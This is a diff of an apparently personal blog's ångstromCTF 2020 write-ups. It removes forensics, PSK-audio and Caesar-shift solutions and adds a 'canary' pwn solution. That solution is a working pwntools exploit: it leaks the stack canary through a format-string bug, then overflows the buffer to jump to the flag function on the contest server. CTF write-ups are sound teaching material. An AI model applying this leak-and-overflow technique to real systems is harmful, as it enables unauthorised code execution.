-14810         0x39DA          Zlib compressed data, default compression
-14969         0x3A79          Zlib compressed data, default compression
-38120         0x94E8          Zlib compressed data, default compression
-38258         0x9572          Zlib compressed data, default compression</span></code></pre></figure>
-
-<p>So I decided to jumb into <code class="highlighter-rouge">wireshark</code> again and look for any <code class="highlighter-rouge">HTTP</code> packets.</p>
-
-<p><a href="/assets/documentation/angstrom-ctf/ws3/wire-3802b822a0a554c70de58ddcad6dc0c349ae1a8d9cb2352b9b70707c65bf752c.png">
-  <img src="/assets/documentation/angstrom-ctf/ws3/wire-3802b822a0a554c70de58ddcad6dc0c349ae1a8d9cb2352b9b70707c65bf752c.png" alt="wire" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/ws3/wire-3802b822a0a554c70de58ddcad6dc0c349ae1a8d9cb2352b9b70707c65bf752c.png" data-zooming-width="1550" data-zooming-height="597">
-</a></p>
-
-<p>I noticed <code class="highlighter-rouge">HTTP</code> packet with length <code class="highlighter-rouge">2131</code> bigger than the others, so let’s look at it.</p>
-
-<p><a href="/assets/documentation/angstrom-ctf/ws3/raw-32fd7938a489dd8171f7ac8c7c715e4937b786a07032b8e0614f005bdf8a1afa.png">
-  <img src="/assets/documentation/angstrom-ctf/ws3/raw-32fd7938a489dd8171f7ac8c7c715e4937b786a07032b8e0614f005bdf8a1afa.png" alt="raw" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/ws3/raw-32fd7938a489dd8171f7ac8c7c715e4937b786a07032b8e0614f005bdf8a1afa.png" data-zooming-width="1392" data-zooming-height="692">
-</a></p>
-
-<p>I know the magic bytes for <code class="highlighter-rouge">zlib</code> file and can be one of:</p>
-<ol>
-  <li>
-<code class="highlighter-rouge">78 01</code> - No Compression/low</li>
-  <li>
-<code class="highlighter-rouge">78 9C</code> - Default Compression</li>
-  <li>
-<code class="highlighter-rouge">78 DA</code> - Best Compression</li>
-</ol>
-
-<p>After looking in the raw bytes for the packet I found first <code class="highlighter-rouge">78 9C</code> and the end of the file is unknown so let’s extract it into a new file.</p>
-
-<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>file file.zlib 
-<span class="go">file.zlib: zlib compressed data</span></code></pre></figure>
-
-<p>I looked again with binwalk the file contains 3 other <code class="highlighter-rouge">zlib</code> files.</p>
-
-<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>binwalk file.zlib 
-<span class="go">DECIMAL       HEXADECIMAL     DESCRIPTION
---------------------------------------------------------------------------------
-0             0x0             Zlib compressed data, default compression
-159           0x9F            Zlib compressed data, default compression
-242           0xF2            Zlib compressed data, default compression</span></code></pre></figure>
-
-<p>So, I decided to extract each one and look at them one by one.</p>
-
-<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span><span class="nb">dd </span><span class="k">if</span><span class="o">=</span>file.zlib <span class="nv">bs</span><span class="o">=</span>1 <span class="nv">count</span><span class="o">=</span>159 <span class="nv">of</span><span class="o">=</span>1.zlip
-<span class="go">159+0 records in
-159+0 records out
-159 bytes copied, 0.0008654 s, 184 kB/s
-</span><span class="gp">root@kali:~#</span><span class="w"> </span><span class="nb">dd </span><span class="k">if</span><span class="o">=</span>file.zlib <span class="nv">bs</span><span class="o">=</span>1 <span class="nv">skip</span><span class="o">=</span>159 <span class="nv">count</span><span class="o">=</span><span class="k">$((</span><span class="m">0</span>xf2-0x9f<span class="k">))</span> <span class="nv">of</span><span class="o">=</span>2.zlip
-<span class="go">83+0 records in
-83+0 records out
-83 bytes copied, 0.00072573 s, 114 kB/s
-</span><span class="gp">root@kali:~#</span><span class="w"> </span><span class="nb">dd </span><span class="k">if</span><span class="o">=</span>file.zlib <span class="nv">bs</span><span class="o">=</span>1 <span class="nv">skip</span><span class="o">=</span>242 <span class="nv">of</span><span class="o">=</span>3.zlip
-<span class="go">17643+0 records in
-17643+0 records out
-17643 bytes (18 kB, 17 KiB) copied, 0.050157 s, 352 kB/s</span></code></pre></figure>
-
-<p>Now, let’s extract them:</p>
-
-<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span><span class="nb">cat </span>3.zlip | python <span class="nt">-c</span> <span class="s2">"import zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))"</span> | <span class="nb">head</span> <span class="nt">-1</span>
-<span class="go">����JFIFHH��C   	
-close failed in file object destructor:
-sys.excepthook is missing
-lost sys.stderr</span></code></pre></figure>
-
-<p>And I got the flag as a <code class="highlighter-rouge">JPEG</code> image at the last file.</p>
-
-<p><a href="/assets/documentation/angstrom-ctf/ws3/flag-45696f671cee10b441388d6a10034488684d9c13abafe2137698cc14ca015d42.jpg">
-  <img src="/assets/documentation/angstrom-ctf/ws3/flag-45696f671cee10b441388d6a10034488684d9c13abafe2137698cc14ca015d42.jpg" alt="flag" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/ws3/flag-45696f671cee10b441388d6a10034488684d9c13abafe2137698cc14ca015d42.jpg" data-zooming-width="413" data-zooming-height="549">
-</a></p>
-
-<p><code class="highlighter-rouge">actf{git_good_git_wireshark-123323}</code></p>
-
-<h3 id="3-psk">3. PSK</h3>
-
-<blockquote>
-  <p>My friend sent my yet another mysterious recording…
-He told me he was inspired by PicoCTF 2019 and made his own transmissions. I’ve looked at it, and it seems to be really compact and efficient.
-Only 31 bps!!
-See if you can decode <a href="https://files.actf.co/eae0a3d5c6d525249b88d8f11881e3a99665c986f526d20d1b8bb98247a8e85a/transmission.wav">what he sent to me</a>. It’s in actf{} format</p>
-</blockquote>
-
-<p>This one I spend some time to figure out what he want and what’s the record. But after searching about <code class="highlighter-rouge">PSK</code> I found It’s just an audio with amplitude and phase-modulated waveform that is converted to an audio frequency analog signal by a sound card.</p>
-
-<p>And guess what it can be decoded usign the PSK31 software like <code class="highlighter-rouge">EssexPSK</code>.</p>
-
-<p>After I download the software and put the mic on the headphones to decode the audio it gives me the flag. <img class="emoji" title=":grinning:" alt=":grinning:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f600.png" height="20" width="20"></p>
-
-<p><a href="/assets/documentation/angstrom-ctf/PSK-5a539985ce01430fbde7a8468521492d026a5b6eef7e27cfaf9b308de706e8d7.png">
-  <img src="/assets/documentation/angstrom-ctf/PSK-5a539985ce01430fbde7a8468521492d026a5b6eef7e27cfaf9b308de706e8d7.png" alt="flag" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/PSK-5a539985ce01430fbde7a8468521492d026a5b6eef7e27cfaf9b308de706e8d7.png" data-zooming-width="841" data-zooming-height="312">
-</a></p>
-
-<p><code class="highlighter-rouge">actf{hamhamhamhamham}</code></p>
-
-<h3 id="4-shifter">4. Shifter</h3>
-
-<blockquote>
-  <p>What a strange challenge…
-It’ll be no problem for you, of course!
-<code class="highlighter-rouge">nc misc.2020.chall.actf.co 20300</code></p>
+  <p>A tear rolled down her face like a tractor. “David,” she said tearfully, “I don’t want to be a farmer no more.”
+—Anonymous
+Can you call the flag function in this <a href="https://files.actf.co/9614bc019231c2b6301e0cb5405423add02b5d1f041da0d3d35986ef34f50b23/canary">program</a> (<a href="https://files.actf.co/27f15f75b231a3179ed0e19f79d9ab4cbd058d5460d7de4bf65f1ff00a228315/canary.c">source</a>)? Try it out on the shell server at <code class="highlighter-rouge">/problems/2020/canary</code> or by connecting with <code class="highlighter-rouge">nc shell.actf.co 20701</code>.</p>
 </blockquote>
 
 <blockquote>
-  <p>hint: Do you really need to calculate all those numbers?</p>
+  <p>hint: That printf call looks dangerous too…</p>
 </blockquote>
 
-<p>This challenges seems interesting when I connect with the server it asks me the following:</p>
+<p>This pwnable challenges from its name looks cool it seems to be about stack canaries and stuff like low level binary and stack protection.</p>
 
-<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>nc misc.2020.chall.actf.co 20300
-<span class="go">Solve 50 of these epic problems in a row to prove you are a master crypto man like Aplet123!
-You'll be given a number n and also a plaintext p.
-Caesar shift `p` with the nth Fibonacci number.
-n &lt; 50, p is completely uppercase and alphabetic, len(p) &lt; 50
-You have 60 seconds!
---------------------
-Shift AZPHUYBJHVY by n=44
-: </span></code></pre></figure>
+<p>It gives us the binary a <code class="highlighter-rouge">64-bit</code> linux file and the source code:</p>
 
-<p>It’s just a ceaser cipher but with key as <a href="https://en.wikipedia.org/wiki/Fibonacci_number">Fibonacci</a> number, and the n he given is pretty small to calculate.</p>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>file canary
+<span class="go">canary: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4c9450f3e2622ff6b7fa8fd33f728edfda901b97, not stripped</span></code></pre></figure>
 
-<p><img src="https://latex.codecogs.com/gif.latex?Fib%28n%29%3DFib%28n-1%29%20&amp;plus;%20Fib%28n-2%29" alt="Fib(n)=Fib(n-1) + Fib(n-2)"></p>
+<p>After analysing the source code I found 2 possible potential vulnerabilities in the <code class="highlighter-rouge">greet</code> function the first one is a buffer overflow at lines <code class="highlighter-rouge">39</code>, <code class="highlighter-rouge">44</code> and the second bug is memory leak (format string) at line <code class="highlighter-rouge">40</code>.</p>
 
-<p>So, let’s write small <code class="highlighter-rouge">python</code> script to do it and get the flag.</p>
+<p>Let’s check the binary:</p>
+
+<p><a href="/assets/documentation/angstrom-ctf/canary/check-3e68a1b5ad256f75256069048658375ae94ffa71f7d9fcce55959daf05ebbbda.png">
+  <img src="/assets/documentation/angstrom-ctf/canary/check-3e68a1b5ad256f75256069048658375ae94ffa71f7d9fcce55959daf05ebbbda.png" alt="check" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/canary/check-3e68a1b5ad256f75256069048658375ae94ffa71f7d9fcce55959daf05ebbbda.png" data-zooming-width="356" data-zooming-height="167">
+</a></p>
+
+<p>The binary enabled <code class="highlighter-rouge">RELRO</code>, <code class="highlighter-rouge">Stack Canary</code>, and <code class="highlighter-rouge">NX</code> and we know the challenge talk about canary.
+So, let’s run the program in <code class="highlighter-rouge">gdb</code> and see what it does:</p>
+
+<p><a href="/assets/documentation/angstrom-ctf/canary/run-900be11a506a3b2b8cb6b4156d58a77838d416e69c2a9e3dbd0c5c631ea5e075.png">
+  <img src="/assets/documentation/angstrom-ctf/canary/run-900be11a506a3b2b8cb6b4156d58a77838d416e69c2a9e3dbd0c5c631ea5e075.png" alt="run" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/canary/run-900be11a506a3b2b8cb6b4156d58a77838d416e69c2a9e3dbd0c5c631ea5e075.png" data-zooming-width="1872" data-zooming-height="984">
+</a></p>
+
+<p>The first input I entered a bunch of <code class="highlighter-rouge">%p</code> to see how it prints the results, and it prints some possible values from the stack.</p>
+
+<p>The second input I entered some <code class="highlighter-rouge">A</code> and it gives me <strong>stack smashing detected</strong> flag.</p>
+
+<p>And by that I knew the random canary value prevents the program from being overflowed or any modification for registers values and if it does the program exits immeadiately.</p>
+
+<p>So, let’s brute force the position of the canary value in the stack.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'critical'</span>
+<span class="k">def</span> <span class="nf">canary_brute</span><span class="p">():</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">28</span><span class="p">):</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="n">level</span><span class="o">=</span><span class="s">"error"</span><span class="p">)</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'name?'</span><span class="p">)</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'AAAA </span><span class="si">%</span><span class="s">{}$lx'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"{} - {}"</span> <span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">canary_brute</span><span class="p">()</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>python canary.py 
+<span class="gp">0 - Nice to meet you, AAAA %0$</span>lx!
+<span class="go">1 - Nice to meet you, AAAA 7fff704e6d20!
+2 - Nice to meet you, AAAA a!
+3 - Nice to meet you, AAAA fffffffffffffff4!
+4 - Nice to meet you, AAAA 7f795c2b0500!
+5 - Nice to meet you, AAAA 12!
+6 - Nice to meet you, AAAA 2436252041414141!
+7 - Nice to meet you, AAAA 7f000a21786c!
+</span><span class="c">...
+</span><span class="go">12 - Nice to meet you, AAAA 0!
+13 - Nice to meet you, AAAA 7ffe85653b00!
+14 - Nice to meet you, AAAA 4006a0!
+15 - Nice to meet you, AAAA 7fff6069f380!
+16 - Nice to meet you, AAAA 0!
+17 - Nice to meet you, AAAA 65d74053b88f5300!
+18 - Nice to meet you, AAAA 7fff86b86a50!
+19 - Nice to meet you, AAAA 4009c9!</span></code></pre></figure>
+
+<p>I know that the canary value must end with <code class="highlighter-rouge">\x00</code> byte and it looks the same at position <code class="highlighter-rouge">17</code> every time I run the script.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="c">...
+</span><span class="gp">Hi! What's your name? %17$</span>p
+<span class="go">Nice to meet you, 0x5f254cc8e0605300!
+</span><span class="c">...</span></code></pre></figure>
+
+<p>We got the the canary let’s calculate the offset of the buffer to overflow the binary. I created a cyclic pattern using <code class="highlighter-rouge">De Bruijn</code> sequence, add breakpoint at <code class="highlighter-rouge">0x400945</code> and ran the program.</p>
+
+<p><a href="/assets/documentation/angstrom-ctf/canary/offset-56f8b0a0363dbfe63811e881bb9f6109ae79e1d1760d31c694052f014ff85cbd.png">
+  <img src="/assets/documentation/angstrom-ctf/canary/offset-56f8b0a0363dbfe63811e881bb9f6109ae79e1d1760d31c694052f014ff85cbd.png" alt="run" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/canary/offset-56f8b0a0363dbfe63811e881bb9f6109ae79e1d1760d31c694052f014ff85cbd.png" data-zooming-width="1373" data-zooming-height="985">
+</a></p>
+
+<p>And we have <code class="highlighter-rouge">RAX: 0x4841413241416341</code> and the offset we need is <code class="highlighter-rouge">56</code>.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">gdb-peda$</span><span class="w"> </span>pattern offset 0x4841413241416341
+<span class="go">5206514328315978561 found at offset: 56</span></code></pre></figure>
 
 <figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python
 </span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'critical'</span>
 
-<span class="n">fib_arr</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">]</span>
-<span class="k">def</span> <span class="nf">fib</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
-    <span class="k">if</span> <span class="n">n</span><span class="o">&lt;=</span><span class="nb">len</span><span class="p">(</span><span class="n">fib_arr</span><span class="p">):</span>
-        <span class="k">return</span> <span class="n">fib_arr</span><span class="p">[</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="n">temp_fib</span> <span class="o">=</span> <span class="n">fib</span><span class="p">(</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">fib</span><span class="p">(</span><span class="n">n</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span>
-        <span class="n">fib_arr</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">temp_fib</span><span class="p">)</span>
-        <span class="k">return</span> <span class="n">temp_fib</span>
-<span class="n">fib</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span>
-<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">text</span><span class="p">,</span><span class="n">k</span><span class="p">):</span>
-    <span class="n">result</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./canary"</span><span class="p">)</span>
+<span class="n">get_flag</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"flag"</span><span class="p">]</span> <span class="c1"># get the offset of the flag() function
+</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'shell.actf.co'</span><span class="p">,</span> <span class="mi">20701</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'name?'</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'</span><span class="si">%17</span><span class="s">$lx'</span><span class="p">)</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">][:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">'Canary: </span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">'Flag func: </span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">get_flag</span><span class="p">))</span>
+<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'me?'</span><span class="p">)</span>
 
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">text</span><span class="p">)):</span>
-        <span class="n">char</span> <span class="o">=</span> <span class="n">text</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
-        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">((</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">+</span> <span class="n">k</span> <span class="o">-</span> <span class="mi">65</span><span class="p">)</span> <span class="o">%</span> <span class="mi">26</span> <span class="o">+</span> <span class="mi">65</span><span class="p">)</span>
-    <span class="k">return</span> <span class="n">result</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">''</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">56</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">'B'</span><span class="o">*</span><span class="mi">8</span> <span class="c1"># fil out rbp register
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">get_flag</span><span class="p">)</span>
 
-<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'misc.2020.chall.actf.co'</span><span class="p">,</span> <span class="mi">20300</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'--------------------'</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
-    <span class="n">s</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)</span>
-    <span class="n">m</span><span class="p">,</span> <span class="n">k</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">fib_arr</span><span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">2</span><span class="p">:])]</span>
-    <span class="k">print</span> <span class="s">'</span><span class="se">\r</span><span class="s">[+] Level'</span><span class="p">,</span> <span class="p">(</span><span class="n">_</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
-    <span class="n">res</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="n">k</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span><span class="n">res</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span></code></pre></figure>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Payload: </span><span class="si">%</span><span class="s">s</span><span class="se">\n</span><span class="s">'</span> <span class="o">%</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">io</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></figure>
 
-<p>And finally I got it.</p>
+<p>I ran the script and got the flag <img class="emoji" title=":grinning:" alt=":grinning:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f600.png" height="20" width="20"></p>
 
-<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>python shifter.py 
-<span class="go">[+] Level 1
-[+] Level 2
-</span><span class="c">.
-.
-.
-</span><span class="go">[+] Level 49
-[+] Level 50
-actf{h0p3_y0u_us3d_th3_f0rmu14-1985098}</span></code></pre></figure>
+<p><a href="/assets/documentation/angstrom-ctf/canary/flag-7d80dfcf783f3c178a210c908dc10396f9b8595dce7fec229f155bd34a548d3f.png">
+  <img src="/assets/documentation/angstrom-ctf/canary/flag-7d80dfcf783f3c178a210c908dc10396f9b8595dce7fec229f155bd34a548d3f.png" alt="run" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/canary/flag-7d80dfcf783f3c178a210c908dc10396f9b8595dce7fec229f155bd34a548d3f.png" data-zooming-width="1480" data-zooming-height="368">
+</a></p>
 
-<blockquote>
-  <p>I’ll update the remaining challenges soon…</p>
-</blockquote>
+<p><code class="highlighter-rouge">actf{youre_a_canary_killer_&gt;:(}</code></p>
 
           </div>
           <div class="article-share">
